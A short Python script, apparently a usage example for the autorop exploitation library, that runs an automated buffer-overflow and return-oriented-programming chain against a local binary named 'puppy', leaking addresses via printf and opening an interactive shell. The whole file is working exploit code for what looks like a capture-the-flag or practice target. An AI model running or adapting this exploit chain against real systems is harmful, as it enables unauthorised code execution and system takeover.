from autorop import *

BIN = "./puppy"


def send_letter_first(tube, data):
    # the binary expects us to choose a letter first, before it takes input unsafely
    tube.sendline("A")
    # send actual payload
    tube.sendline(data)


# create a starting state
s = PwnState(BIN, lambda: process(BIN))
# set an overwriter function, if the buffer overflow input
# is not available immediately
#s.overwriter = send_letter_first

# use base classic pipeline, with printf for leaking
pipeline = turnkey.Classic(leak=leak.Printf())
result = pipeline(s)

# switch to interactive shell which we got via the exploit
result.target.interactive()
